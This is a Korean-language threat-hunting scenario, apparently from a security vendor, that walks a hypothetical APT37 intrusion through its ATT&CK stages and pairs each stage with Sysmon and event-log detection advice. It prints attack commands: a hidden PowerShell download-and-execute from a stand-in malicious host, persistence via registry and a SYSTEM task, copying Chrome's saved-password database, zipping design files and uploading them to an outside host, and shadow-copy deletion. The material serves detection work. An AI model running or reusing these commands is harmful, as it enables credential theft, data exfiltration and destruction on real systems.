# APT37(ScarCruft) — 가상의 Windows 침투 시나리오

## 가정 환경

* **대상**: 한국 소재 제조업 본사 네트워크 (Windows 10/11 클라이언트)
* **모니터링**: 기본 이벤트 로그 + Sysmon v13 구성
* **보안 설정**: UAC 기본값 유지 (EnableLUA = 1)
* **목표**: R\&D 설계 도면 탈취 후 내부 중요 PC 파괴

---

## 1️⃣ 초기 침투 (Initial Access / Execution)

| 순서  | TID                                   | 행위                          |
| --- | ------------------------------------- | --------------------------- |
| 1-1 | T1566.001 – Spear Phishing Attachment | 팀장에게 악성 한글(HWP) 문서 첨부 메일 발송 |
| 1-2 | T1204.002 – User Execution            | 사용자가 문서 열람, 매크로 실행          |
| 1-3 | T1105 – Ingress Tool Transfer         | 최종 백도어(Dolphin) 다운로드 및 실행   |

```powershell
powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://cdn.evilsite.kr/dropper.ps1')"
```

**추가 고려사항**

* `powershell.exe -enc`, `bitsadmin`, `certutil`, `Invoke-WebRequest`, `curl` 등을 이용한 변종 다운로드도 감지 필요.
* Sysmon ID 1 또는 Windows Event ID 4688에서 **`-ep bypass`, `-w hidden`, `IEX(Invoke-Expression)`** 등 파라미터를 모니터링.

---

## 2️⃣ 권한 상승·지속화 (Privilege Escalation / Persistence)

| 순서  | TID                                     | 행위                                       |
| --- | --------------------------------------- | ---------------------------------------- |
| 2-1 | T1548.002 – Bypass User Account Control | UAC 우회 (**Akagi/UACMe** + fodhelper.exe) |
| 2-2 | T1547.001 – Registry Run Keys           | Run 키 등록으로 사용자 로그인 시 자동 실행               |

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "%APPDATA%\update.exe"
```

| 순서  | TID                        | 행위                       |
| --- | -------------------------- | ------------------------ |
| 2-3 | T1053.005 – Scheduled Task | SYSTEM 권한 확보 위한 예약 작업 생성 |

```cmd
schtasks /Create /RU SYSTEM /SC ONSTART /TN "SvcInit" /TR "%APPDATA%\update.exe"
```

**추가 고려사항**

* `schtasks /Create ... /RU SYSTEM` 외에도 `sc create`, `New-Service`(PowerShell) 등을 통한 서비스 생성 시도 감시 필요.
* PLURA-EDR 등을 활용해 **Akagi/UACMe** 파일 해시 및 실행 패턴 탐지.

---

## 3️⃣ 시스템·사용자 조사 (Discovery)

| 순서  | TID                                  | 행위                       |
| --- | ------------------------------------ | ------------------------ |
| 3-1 | T1082 – System Information Discovery | OS, 패치, 도메인 정보 수집        |
| 3-2 | T1033 – System Owner/User Discovery  | 사용자 정보 및 권한 확인           |
| 3-3 | T1057 – Process Discovery            | 백신 및 보안 프로세스 확인          |
| 3-4 | T1120 – Peripheral Device Discovery  | 외장 USB 탐지 (설계도 백업 여부 확인) |

```powershell
powershell -c "Get-PnpDevice -Class USB"
```

**추가 고려사항**

* `systeminfo`, `whoami`, `wmic process get name` 등도 자주 사용되므로, Sysmon ID 1 / Event ID 4688에서 이러한 명령어 실행 기록 탐지.

---

## 4️⃣ 자격 증명·데이터 수집 (Credential Access / Collection)

### 4-1. 브라우저 저장 자격 증명 탈취

| 순서  | TID                                       | 행위              |
| --- | ----------------------------------------- | --------------- |
| 4-1 | T1555.003 – Credentials from Web Browsers | Chrome 저장 암호 덤프 |

```powershell
:: (예시 1) 레지스트리 기반 접근
powershell -ep bypass -c "(Get-ItemProperty -Path 'HKCU:\Software\Google\Chrome\...') > '%TEMP%\chrome_creds.txt'"
```

**추가 예시**

```powershell
:: (예시 2) Chrome 'Login Data' 파일 직접 접근
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" "$env:TEMP\chromeLoginData.db"
```

* 실제 크롬 암호는 **`Login Data` SQLite DB** 파일에서 추출되므로, 해당 파일 복사 후 `sqlite3.exe`로 덤프하거나 PowerShell 모듈로 접근 가능.
* Event ID 4656(Handle to an Object)에서 **`Login Data`** 파일 접근 시도가 포착될 수 있음.

### 4-2. 시스템 내 데이터 수집

| 순서  | TID                            | 행위                     |
| --- | ------------------------------ | ---------------------- |
| 4-2 | T1005 – Data from Local System | CAD/PDF 도면 검색 및 ZIP 압축 |

```powershell
$dir="C:\Projects"; $zip="$env:TEMP\designs.zip"; Compress-Archive -Path $dir\*.pdf,$dir\*.dwg -DestinationPath $zip
```

### 4-3. 오디오 캡처

| 순서  | TID                   | 행위        |
| --- | --------------------- | --------- |
| 4-3 | T1123 – Audio Capture | 회의 녹음 15초 |

```cmd
"%ProgramFiles%\AudioRecorder.exe" -out "%TEMP%\meeting.wav" -d 15
```

---

## 5️⃣ C2 통신·데이터 유출 (Command & Control / Exfiltration)

| 순서  | TID                               | 행위               |
| --- | --------------------------------- | ---------------- |
| 5-1 | T1071.001 – Web Protocols (HTTPS) | CDN 기반 HTTPS 터널링 |

```cmd
bitsadmin /transfer myDownload /download /priority normal "https://cdn.dropzone.net/beacon" "%TEMP%\b.dat"
```

| 순서  | TID                           | 행위          |
| --- | ----------------------------- | ----------- |
| 5-2 | T1105 – Ingress Tool Transfer | 설계도 압축본 업로드 |

```powershell
Invoke-RestMethod "https://cdn.dropzone.net/upload" -InFile "$env:TEMP\designs.zip"
```

**추가 고려사항**

* HTTPS 트래픽일지라도 **SNI 필드**(`cdn-*` 등) 기반 의심 도메인 식별 필요.
* `curl`, `Invoke-WebRequest`, `certutil` 등을 통한 업로드·다운로드 기법 변종 모니터링.

---

## 6️⃣ 파괴 행위 (Impact)

| 순서  | TID                            | 행위                 |
| --- | ------------------------------ | ------------------ |
| 6-1 | T1529 – System Shutdown/Reboot | 강제 재부팅 → 암호화 전환 시도 |

```cmd
shutdown /r /t 1 /f
```

| 순서  | TID                                     | 행위                 |
| --- | --------------------------------------- | ------------------ |
| 6-2 | T1027 – Obfuscated Files or Information | 랜섬노트 실행 Base64 인젝션 |

```powershell
powershell -c "IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('base64encodedransomscript==')))"`
```

**추가 고려사항**

* 실제 랜섬화 과정에서 **VSS(볼륨 섀도 복사본) 삭제**(`vssadmin delete shadows /all /quiet`) 등을 함께 수행해 복구 차단 가능성 있음.
* 대량의 파일 확장자 변환, 암호화 이벤트를 빠르게 감지할 수 있도록 **파일 무결성 모니터링(FIM)**, **UEBA** 등의 연동 권장.

---

## 📌 탐지·수색 포인트 요약

| 단계     | Sysmon/Event ID           | 탐지 키워드                                  |
| ------ | ------------------------- | --------------------------------------- |
| 권한 상승  | Sysmon 1 (ProcessCreate)  | `Akagi64.exe`, `fodhelper.exe` (UAC 우회) |
| 시스템 조사 | Sysmon 1 / 4688           | `systeminfo`, `wmic`, `whoami`          |
| 자격 탈취  | Event ID 4656             | **Chrome `Login Data`** 파일 접근, Reg Key  |
| 외부 전송  | Sysmon 3 (NetworkConnect) | 외부 443 → SNI: `cdn-*`                   |
| 시스템 파괴 | Event ID 1074             | `Shutdown Type: restart`                |

**추가**

* PowerShell 스크립트블록 로깅(AMSI, ScriptBlockLogging)에서 **`IEX`, `-enc`, `FromBase64String`** 등 탐지 가능.

---

## 🔒 PLURA-XDR 대응 방법 요약 및 참고 자료

1. **의심스러운 HWP/LNK 첨부 파일 차단 및 정밀 검사**

   * 매크로·스크립트 포함 여부 탐지 강화.
2. **PowerShell IEX 및 Base64 인코딩 탐지 정책 강화**

   * `-ep bypass`, `-w hidden`, `-enc` 등 파라미터 모니터링.
3. **Sysmon + PLURA-XDR 기반의 로그 상관 분석**

   * 이벤트 시퀀스(문서 열람 → PowerShell → Registry 수정 → HTTPS 통신 등) 추적.
4. **PLURA-EDR 통한 Akagi 실행·UAC 우회 패턴 탐지**

   * UACMe, fodhelper.exe 관련 실행 이력 추적.
5. **LNK 및 예약 작업 생성 탐지 정책 설정**

   * `schtasks /Create ...`, `New-Service` / `sc create` 등도 함께 모니터링.
6. **VSS 및 파일 암호화 시도 방어**

   * VSS 삭제 여부, 대량 파일 확장자 변경 행위를 조기 탐지.

👉 [자세히 보기](plura_waf_xdr_detection.md)

---

> **정리**
> 위 시나리오는 APT37(ScarCruft)이 실제로 활용할 수 있는 전형적인 **문서 기반 침투 → 권한 상승·지속화 → 내부 정보 수집 → C2 통신 → 파괴(랜섬)** 흐름을 다룹니다.
> 각 단계에서 **PowerShell 명령어**, **UAC 우회**, **Chrome Credential DB 접근**, **ZIP 압축 후 업로드** 등 구체적인 TTP가 제시되어 있으므로, **Sysmon** 및 **PLURA-XDR** 규칙을 활용해 의심 행위를 조기에 식별·대응해야 합니다.
